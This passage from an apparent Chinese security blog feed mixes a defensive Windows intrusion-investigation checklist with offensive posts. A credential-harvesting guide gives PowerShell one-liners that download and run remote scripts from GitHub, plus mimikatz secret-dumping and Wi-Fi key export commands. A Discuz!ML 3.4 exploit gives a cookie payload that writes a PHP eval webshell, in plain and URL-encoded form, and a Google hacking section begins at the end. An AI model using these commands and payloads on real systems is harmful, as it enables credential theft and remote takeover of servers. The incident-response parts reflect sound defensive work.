alt></p><p>2、进程</p><ul><li><p>检查方法：</p><p>a、开始–运行–输入msinfo32，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间等。</p><p>b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</p><p>c、通过微软官方提供的 Process Explorer 等工具进行排查 。</p><p>d、查看可疑的进程及其子进程。可以通过观察以下内容：</p><pre><code>没有签名验证信息的进程没有描述信息的进程进程的属主进程的路径是否合法CPU或内存资源占用长时间过高的进程</code></pre></li></ul><p>3、小技巧：</p><p>​    a、查看端口对应的PID： netstat -ano | findstr “port”</p><p>​    b、查看进程对应的PID：任务管理器–查看–选择列–PID 或者  tasklist  | findstr “PID”</p><p>​    c、查看进程对应的程序位置：</p><p>​        任务管理器–选择对应进程–右键打开文件位置</p><p>​        运行输入 wmic，cmd界面 输入  process</p><p>​    d、tasklist /svc   进程–PID–服务</p><p>​    e、查看Windows服务所对应的端口：<br>​        %system%/system32/drivers/etc/services（一般%system%就是C:\Windows）</p><h4 id="1-3-检查启动项、计划任务、服务"><a href="#1-3-检查启动项、计划任务、服务" class="headerlink" title="1.3 检查启动项、计划任务、服务"></a>1.3 检查启动项、计划任务、服务</h4><p>1、检查服务器是否有异常的启动项。</p><ul><li><p>检查方法：</p><p>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。<br>b、单击开始菜单 &gt;【运行】，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。<br>c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：<br>HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce<br>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p><p>d、利用安全软件查看启动项、开机时间管理等。</p><p>e、组策略，运行gpedit.msc。</p></li></ul><p><img src="/images/sum-1-4.png" alt></p><p>2、检查计划任务</p><ul><li><p>检查方法：</p><p>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</p><p>b、单击【开始】&gt;【运行】；输入 cmd，然后输入at，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</p></li></ul><p>3、服务自启动</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入services.msc，注意服务状态和启动类型，检查是否有异常服务。</li></ul><h4 id="1-4-检查系统相关信息"><a href="#1-4-检查系统相关信息" class="headerlink" title="1.4 检查系统相关信息"></a>1.4 检查系统相关信息</h4><p>1、查看系统版本以及补丁信息</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入systeminfo，查看系统信息</li></ul><p>2、查找可疑目录及文件</p><ul><li><p>检查方法：</p><p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p><p>​    Window 2003  C:\Documents and Settings</p><p>​    Window 2008R2  C:\Users\</p><p>b、单击【开始】&gt;【运行】，输入%UserProfile%\Recent，分析最近打开分析可疑文件。</p><p>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p><p>d、回收站、浏览器下载目录、浏览器历史记录</p><p>e、修改时间在创建时间之前的为可疑文件</p></li></ul><p>3、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>​    a、利用 Registry Workshop  注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。</p><p>​    b、利用计算机自带文件搜索功能，指定修改时间进行搜索。</p><h4 id="1-5-自动化查杀"><a href="#1-5-自动化查杀" class="headerlink" title="1.5 自动化查杀"></a>1.5 自动化查杀</h4><ul><li><p>病毒查杀</p><ul><li>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</li></ul></li><li><p>webshell查杀</p><ul><li>检查方法：选择具体站点路径进行webshell查杀，建议使用两款webshell查杀工具同时查杀，可相互补充规则库的不足。</li></ul></li></ul><h4 id="1-6-日志分析"><a href="#1-6-日志分析" class="headerlink" title="1.6 日志分析"></a>1.6 日志分析</h4><p>系统日志</p><ul><li><p>分析方法：</p><p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>b、Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>C、导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析。</p></li></ul><p>WEB访问日志</p><ul><li><p>分析方法：</p><p>a、找到中间件的web日志，打包到本地方便进行分析。</p><p>b、推荐工具：Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p><p>​                 Linux下，使用Shell命令组合查询分析</p></li></ul><h3 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h3><h4 id="2-1-病毒分析"><a href="#2-1-病毒分析" class="headerlink" title="2.1 病毒分析"></a>2.1 病毒分析</h4><p>PCHunter：<a href="http://www.xuetr.com" target="_blank" rel="noopener">http://www.xuetr.com</a></p><p>火绒剑：<a href="https://www.huorong.cn" target="_blank" rel="noopener">https://www.huorong.cn</a></p><p>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><p>processhacker：<a href="https://processhacker.sourceforge.io/downloads.php" target="_blank" rel="noopener">https://processhacker.sourceforge.io/downloads.php</a></p><p>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><p>OTL：<a href="https://www.bleepingcomputer.com/download/otl/" target="_blank" rel="noopener">https://www.bleepingcomputer.com/download/otl/</a></p><p>SysInspector：<a href="http://download.eset.com.cn/download/detail/?product=sysinspector" target="_blank" rel="noopener">http://download.eset.com.cn/download/detail/?product=sysinspector</a></p><h4 id="2-2-病毒查杀"><a href="#2-2-病毒查杀" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h4><p>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe" target="_blank" rel="noopener">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a>   （推荐理由：绿色版、最新病毒库）</p><p>大蜘蛛：<a href="http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）" target="_blank" rel="noopener">http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</a></p><p>火绒安全软件：<a href="https://www.huorong.cn" target="_blank" rel="noopener">https://www.huorong.cn</a></p><p>360杀毒：<a href="http://sd.360.cn/download_center.html" target="_blank" rel="noopener">http://sd.360.cn/download_center.html</a></p><h4 id="2-3-病毒动态"><a href="#2-3-病毒动态" class="headerlink" title="2.3 病毒动态"></a>2.3 病毒动态</h4><p>CVERC-国家计算机病毒应急处理中心：<a href="http://www.cverc.org.cn" target="_blank" rel="noopener">http://www.cverc.org.cn</a></p><p>微步在线威胁情报社区：<a href="https://x.threatbook.cn" target="_blank" rel="noopener">https://x.threatbook.cn</a></p><p>火绒安全论坛：<a href="http://bbs.huorong.cn/forum-59-1.html" target="_blank" rel="noopener">http://bbs.huorong.cn/forum-59-1.html</a></p><p>爱毒霸社区：<a href="http://bbs.duba.net" target="_blank" rel="noopener">http://bbs.duba.net</a></p><p>腾讯电脑管家：<a href="http://bbs.guanjia.qq.com/forum-2-1.html" target="_blank" rel="noopener">http://bbs.guanjia.qq.com/forum-2-1.html</a></p><h4 id="2-4-在线病毒扫描网站"><a href="#2-4-在线病毒扫描网站" class="headerlink" title="2.4 在线病毒扫描网站"></a>2.4 在线病毒扫描网站</h4><p><a href="http://www.virscan.org" target="_blank" rel="noopener">http://www.virscan.org</a>         //多引擎在线病毒扫描网 v1.02，当前支持 41 款杀毒引擎     </p><p><a href="https://habo.qq.com" target="_blank" rel="noopener">https://habo.qq.com</a>             //腾讯哈勃分析系统</p><p><a href="https://virusscan.jotti.org" target="_blank" rel="noopener">https://virusscan.jotti.org</a>      //Jotti恶意软件扫描系统</p><p><a href="http://www.scanvir.com" target="_blank" rel="noopener">http://www.scanvir.com</a>        //针对计算机病毒、手机病毒、可疑文件等进行检测分析</p><h4 id="2-5-webshell查杀"><a href="#2-5-webshell查杀" class="headerlink" title="2.5 webshell查杀"></a>2.5 webshell查杀</h4><p>D盾_Web查杀：<a href="http://www.d99net.net/index.asp" target="_blank" rel="noopener">http://www.d99net.net/index.asp</a></p><p>河马webshell查杀：<a href="http://www.shellpub.com" target="_blank" rel="noopener">http://www.shellpub.com</a></p><p>深信服Webshell网站后门检测工具：<a href="http://edr.sangfor.com.cn/backdoor_detection.html" target="_blank" rel="noopener">http://edr.sangfor.com.cn/backdoor_detection.html</a></p><p>Safe3：<a href="http://www.uusec.com/webshell.zip" target="_blank" rel="noopener">http://www.uusec.com/webshell.zip</a></p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第一章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应</title>
      <link href="/2019/10/16/%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/10/16/%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>转自大佬 Bypass007</p><p><a href="https://github.com/Bypass007/Emergency-Response-Notes" target="_blank" rel="noopener">GitHub 地址</a><br><a href="https://bypass007.github.io/Emergency-Response-Notes/" target="_blank" rel="noopener">GitBook 地址</a></p><h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>面对各种各样的安全事件，我们该怎么处理？</p><p>这是一个关于安全事件应急响应的项目，从系统入侵到事件处理，收集和整理了一些案例进行分析。</p><p>我将持续更新这份笔记，希望能帮到有需要的人。</p><p>如果你看到好的案例，欢迎通过issue提交。</p><h2 id="项目目录"><a href="#项目目录" class="headerlink" title="项目目录"></a>项目目录</h2><h3 id="第一章：应急响应"><a href="#第一章：应急响应" class="headerlink" title="[第一章：应急响应]"></a>[第一章：应急响应]</h3><p>第1篇:Window入侵排查</p><p>第2篇:Linux入侵排查</p><h3 id="第二章：日志分析"><a href="#第二章：日志分析" class="headerlink" title="[第二章：日志分析]"></a>[第二章：日志分析]</h3><p>第1篇:Window日志分析</p><p>第2篇:Linux日志分析</p><p>第3篇:Web日志分析</p><p>第4篇:MSSQL日志分析</p><p>第5篇:MySQL日志分析</p><h3 id="第三章-Windows实战篇"><a href="#第三章-Windows实战篇" class="headerlink" title="[第三章:Windows实战篇]"></a>[第三章:Windows实战篇]</h3><p>第1篇：FTP暴力破解</p><p>第2篇：蠕虫病毒</p><p>第3篇：勒索病毒</p><p>第4篇：ARP病毒</p><p>第5篇：挖矿病毒（一）</p><p>第6篇：挖矿病毒（二）</p><h3 id="第四章：Linux实战篇"><a href="#第四章：Linux实战篇" class="headerlink" title="[第四章：Linux实战篇]"></a>[第四章：Linux实战篇]</h3><p>第1篇：SSH暴力破解</p><p>第2篇：捕捉短连接</p><p>第3篇：挖矿病毒</p><p>第4篇：盖茨木马</p><p>第5篇：DDOS病毒</p><p>第6篇：Shell病毒</p><h3 id="第五章：Web实战篇"><a href="#第五章：Web实战篇" class="headerlink" title="[第五章：Web实战篇]"></a>[第五章：Web实战篇]</h3><p>第1篇：网站被植入Webshell</p><p>第2篇：门罗币恶意挖矿</p><p>第3篇：批量挂黑页</p><p>第4篇：新闻源网站劫持</p><p>第5篇：移动端劫持</p><p>第6篇：搜索引擎劫持</p><p>第7篇：网站首页被篡改</p><p>第8篇：管理员账号被篡改</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>密码抓取</title>
      <link href="/2019/10/14/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
      <url>/2019/10/14/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<h1 id="密码抓取"><a href="#密码抓取" class="headerlink" title="密码抓取"></a>密码抓取</h1><p>转自<a href="http://www.mottoin.com/detail/2211.html" target="_blank" rel="noopener">后渗透凭证收集</a><br>url：<a href="http://www.mottoin.com/detail/2211.html" target="_blank" rel="noopener">http://www.mottoin.com/detail/2211.html</a></p><h3 id="一、浏览器-chrome"><a href="#一、浏览器-chrome" class="headerlink" title="一、浏览器 chrome"></a>一、浏览器 chrome</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:UsersAdministratorAppDataLocalGoogleChromeUser DataDefault</span><br><span class="line">firefox</span><br><span class="line">C:UsersAdministratorAppDataLocalMozillaFirefoxProfiles</span><br><span class="line">IE</span><br><span class="line">C:UsersAdministratorAppDataLocalMicrosoftCredentials</span><br></pre></td></tr></table></figure><p>也可使用工具进行抓取 BrowserPasswordDump.exe支持导出如下密码 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Firefox</span><br><span class="line">Google Chrome</span><br><span class="line">Microsoft Edge</span><br><span class="line">Internet Explorer</span><br><span class="line">UC Browser</span><br><span class="line">Torch Browser</span><br><span class="line">Chrome Canary/SXS</span><br><span class="line">CoolNovo Browser</span><br><span class="line">Opera Browser</span><br><span class="line">Apple Safari</span><br><span class="line">Flock Browser</span><br><span class="line">SeaMonkey Browser</span><br><span class="line">SRWare Iron Browser</span><br><span class="line">Comodo Dragon Browser</span><br></pre></td></tr></table></figure><h3 id="二、windows凭据管理器"><a href="#二、windows凭据管理器" class="headerlink" title="二、windows凭据管理器"></a>二、windows凭据管理器</h3><blockquote><p>cmdkey /list<br><img src="http://www.mottoin.com/wp-content/uploads/2018/09/0ce77d10215b34bcd8061b54156232f4.png" alt="图片"></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RDP连接记录</span><br><span class="line">reg query &quot;HKCUSoftwareMicrosoftTerminal Server ClientDefault&quot;  </span><br><span class="line">抓取密码  </span><br><span class="line">powershell.exe &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1&apos;);Invoke-WCMDump&quot;</span><br></pre></td></tr></table></figure><h5 id="也可以用mimikatz"><a href="#也可以用mimikatz" class="headerlink" title="也可以用mimikatz"></a>也可以用mimikatz</h5><blockquote><p>mimikatz.exe vault::cred<br><img src="http://www.mottoin.com/wp-content/uploads/2018/09/a5b23aafc66096ef2f36bcc8158c7a04.png" alt="图片"></p></blockquote><h3 id="三、邮箱-EmailPasswordDump-exe支持导出如下密码"><a href="#三、邮箱-EmailPasswordDump-exe支持导出如下密码" class="headerlink" title="三、邮箱 EmailPasswordDump.exe支持导出如下密码"></a>三、邮箱 EmailPasswordDump.exe支持导出如下密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Outlook Express</span><br><span class="line">Microsoft Outlook 2002/XP/2003/2007/2010/2013</span><br><span class="line">Mozilla Thunderbird</span><br><span class="line">Windows Live Mail 2012</span><br><span class="line">IncrediMail</span><br><span class="line">Opera Mail</span><br><span class="line">The Bat!</span><br><span class="line">Foxmail v6.x - v7.x</span><br><span class="line">Windows Live Messenger</span><br><span class="line">MSN Messenger</span><br><span class="line">Google Talk</span><br><span class="line">GMail Notifier</span><br><span class="line">PaltalkScene IM</span><br><span class="line">Pidgin (Formerly Gaim) Messenger</span><br><span class="line">Miranda Messenger</span><br><span class="line">Windows Credential Manager</span><br><span class="line">OutlookPasswordDump.exe</span><br></pre></td></tr></table></figure><h3 id="四、软件注册表"><a href="#四、软件注册表" class="headerlink" title="四、软件注册表"></a>四、软件注册表</h3><blockquote><p>REG query “HKEY_CURRENT_USERSoftware” /v “password” /s<br>《后渗透凭证收集》</p></blockquote><h3 id="五、无线密码-列出连接过的wifi"><a href="#五、无线密码-列出连接过的wifi" class="headerlink" title="五、无线密码 列出连接过的wifi"></a>五、无线密码 列出连接过的wifi</h3><blockquote><p>netsh wlan show profiles</p></blockquote><h5 id="导出密码"><a href="#导出密码" class="headerlink" title="导出密码"></a>导出密码</h5><blockquote><p>netsh wlan export profile interface=无线网络连接 key=clear folder=C:windowstemp</p></blockquote><h3 id="六、VPN"><a href="#六、VPN" class="headerlink" title="六、VPN"></a>六、VPN</h3><blockquote><p>C:UsersAdministratorAppDataRoamingMicrosoftNetworkConnectionsPbk</p></blockquote><h5 id="mimikatz抓VPN密码"><a href="#mimikatz抓VPN密码" class="headerlink" title="mimikatz抓VPN密码"></a>mimikatz抓VPN密码</h5><blockquote><p>mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit</p></blockquote><h3 id="七、windows其他部分信息-无人值守安装"><a href="#七、windows其他部分信息-无人值守安装" class="headerlink" title="七、windows其他部分信息 无人值守安装"></a>七、windows其他部分信息 无人值守安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:unattend.xml</span><br><span class="line">C:WindowsPantherUnattend.xml</span><br><span class="line">C:WindowsPantherUnattendUnattend.xml</span><br><span class="line">C:Windowssystem32sysprep.inf</span><br><span class="line">C:Windowssystem32sysprepsysprep.xml</span><br><span class="line">windows密码错误提示信息</span><br><span class="line">reg query HKLMSAMSAMDomainsAccountUsers&lt;userkey&gt;UserPasswordHint</span><br><span class="line">windows缓存hash</span><br><span class="line">reg query HKEY_LOCAL_MACHINESECURITYCACHE</span><br><span class="line">gpp</span><br><span class="line">dir \&lt;DOMAIN&gt;SYSVOL /s /b /A | find &quot;.xml&quot;</span><br><span class="line">windows自动登录</span><br><span class="line">reg query &quot;HKLMSOFTWAREMicrosoftWindows NTCurrentversionWinlogon&quot;</span><br></pre></td></tr></table></figure><h3 id="八、laZagne-抓多种类型密码小工具"><a href="#八、laZagne-抓多种类型密码小工具" class="headerlink" title="八、laZagne 抓多种类型密码小工具"></a>八、laZagne 抓多种类型密码小工具</h3><blockquote><p><a href="https://github.com/AlessandroZ/LaZagne.git" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne.git</a><br>支持抓取的密码如下</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chats,mails,all,git,svn,database,windows,wifi,sysadmin,browsers,games,memory,php,maven</span><br></pre></td></tr></table></figure><h3 id="九、进程相关-从目标进程中搜索敏感字符串"><a href="#九、进程相关-从目标进程中搜索敏感字符串" class="headerlink" title="九、进程相关 从目标进程中搜索敏感字符串"></a>九、进程相关 从目标进程中搜索敏感字符串</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;iex (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1&apos;);Invoke-mimikittenz&quot;</span><br></pre></td></tr></table></figure><p>进程如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#####Webmail#####</span><br><span class="line"></span><br><span class="line">Gmail</span><br><span class="line">Office365</span><br><span class="line">Outlook Web</span><br><span class="line">#####Accounting#####</span><br><span class="line"></span><br><span class="line">Xero</span><br><span class="line">MYOB</span><br><span class="line">#####Remote Access#####</span><br><span class="line"></span><br><span class="line">Juniper SSL-VPN</span><br><span class="line">Citrix NetScaler</span><br><span class="line">Remote Desktop Web Access 2012</span><br><span class="line">#####Developement#####</span><br><span class="line"></span><br><span class="line">Jira</span><br><span class="line">Github</span><br><span class="line">Bugzilla</span><br><span class="line">Zendesk</span><br><span class="line">Cpanel</span><br><span class="line">#####IHateReverseEngineers#####</span><br><span class="line"></span><br><span class="line">Malwr</span><br><span class="line">VirusTotal</span><br><span class="line">AnubisLabs</span><br><span class="line">#####Misc#####</span><br><span class="line"></span><br><span class="line">Dropbox</span><br><span class="line">Microsoft Onedrive</span><br><span class="line">AWS Web Services</span><br><span class="line">Slack</span><br><span class="line">Twitter</span><br><span class="line">Facebook</span><br></pre></td></tr></table></figure><h3 id="其他信息-FileZilla、PuTTY、WinSCP、rdp"><a href="#其他信息-FileZilla、PuTTY、WinSCP、rdp" class="headerlink" title="其他信息 FileZilla、PuTTY、WinSCP、rdp"></a>其他信息 FileZilla、PuTTY、WinSCP、rdp</h3><p><img src="http://www.mottoin.com/wp-content/uploads/2018/09/828dd7aaa179d4b78a40e1afcfabe21d.png" alt="图片"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/fireeye/SessionGopher/master/SessionGopher.ps1&apos;);Invoke-SessionGopher&quot;</span><br></pre></td></tr></table></figure><h4 id="Teamviewer"><a href="#Teamviewer" class="headerlink" title="Teamviewer"></a>Teamviewer</h4><p><code>https://github.com/vah13/extractTVpasswords.git</code></p><h4 id="mcafee"><a href="#mcafee" class="headerlink" title="mcafee"></a>mcafee</h4><p><code>%AllUsersProfile%Application DataMcAfeeCommon FrameworkSiteList.xml</code></p><h4 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h4><p><code>reg query &quot;HKLMSYSTEMCurrentControlSetServicesSNMP&quot;</code></p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码抓取 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>discuz x3.4 getshell</title>
      <link href="/2019/10/07/discuz-x3-4-getshell/"/>
      <url>/2019/10/07/discuz-x3-4-getshell/</url>
      
        <content type="html"><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，进行远程代码执行利用，该漏洞利用方式简单，危害性较大。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>由于Discuz! ML对于cookie字段的不恰当处理造成的<br>cookie字段中的language参数未经过滤，直接被拼接写入缓存文件之中，<br>而缓存文件随后又被加载，从而造成代码执行</p><h3 id="漏洞影响版本："><a href="#漏洞影响版本：" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>Discuz!ML v.3.4<br>Discuz!ML v.3.3<br>Discuz!ML v.3.2   </p><h3 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h3><p><code>XXXX_language=</code></p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>注意其中的：4gH4_0df5_language=en;<br>修改为：4gH4_0df5_language=’.phpinfo().’;  </p><p><img src="/images/discuzx3.4.png" alt><br>可以看见phpinfo执行成功了。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>XXXX_language=’.phpinfo().’<br>xxxx自己改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;.+file_put_contents(&apos;cx.php&apos;,urldecode(&apos;&lt;?php  eval($_POST[&quot;cx&quot;]);?&gt;&apos;)).&apos;</span><br><span class="line">url编码一下</span><br><span class="line">%27.%2bfile_put_contents(%27cx.php%27%2curldecode(%27%3c%3fphp++eval(%24_POST%5b%22cx%22%5d)%3b%3f%3e%27)).%27</span><br></pre></td></tr></table></figure><p>写入webshell，自己去连接一句话吧！</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>google hack 语法</title>
      <link href="/2019/10/07/google-hack-%E8%AF%AD%E6%B3%95/"/>
      <url>/2019/10/07/google-hack-%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="google-hack-语法大全"><a href="#google-hack-语法大全" class="headerlink" title="google hack 语法大全"></a>google hack 语法大全</h2><p><img src="/images/google.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Site　　指定域名  </span><br><span class="line">Intext　　　　正文中出现关键字的网页  </span><br><span class="line">Intitle　　　　标题中出现关键字的网页  </span><br><span class="line">Info　　　　  一些基本信息包含关键字的网页  </span><br><span class="line">Inurl　　　    url中存在关键字的网页  </span><br><span class="line">Filetype　　  指定文件类型  </span><br><span class="line">Cache　　    Google搜索缓存的网页副本  </span><br><span class="line"></span><br><span class="line">intitle:搜索标题  </span><br><span class="line">inurl:搜索url  </span><br><span class="line">intext:搜索网页正文内容  </span><br><span class="line">+ 连接  </span><br><span class="line">site: 在某网站下搜寻  </span><br><span class="line">site: www.any.com + inurl:admin  </span><br><span class="line">intext: to parent directory + intext : mdb  </span><br><span class="line">filetype: ppt,asp,php  </span><br><span class="line">intext:to parent directory  </span><br><span class="line">intext:转到父目录/转到父路径</span><br></pre></td></tr></table></figure><h3 id="常见操作符："><a href="#常见操作符：" class="headerlink" title="常见操作符："></a>常见操作符：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">. 　　  单一的通配符   </span><br><span class="line">*　　   通配符，可代表多个字母   </span><br><span class="line">&quot;&quot;　　 精确查询  </span><br><span class="line">+ 强制搜索,即必须包含加号后面的内容;  </span><br><span class="line">– 把某个字忽略  </span><br><span class="line">~ 同意词  </span><br><span class="line">..在什么范围(1..10000)</span><br></pre></td></tr></table></figure><h3 id="2-常用案例"><a href="#2-常用案例" class="headerlink" title="2 常用案例"></a>2 常用案例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1. 搜索指定网站的子域名  </span><br><span class="line">site:XXX.com  </span><br><span class="line"></span><br><span class="line">2. 搜索指定网站的管理员入口  </span><br><span class="line">intitle:管理登陆 site:XXX.com     </span><br><span class="line">intitle中的关键字可以换成后台，后台管理，管理员……  </span><br><span class="line">inurl:login site:XXX.com　  </span><br><span class="line">inurl中的关键字也可以换成guanlidenglu，admin……  </span><br><span class="line"></span><br><span class="line">3. 搜索指定网站的doc文档（Excel/PDF/PPT）  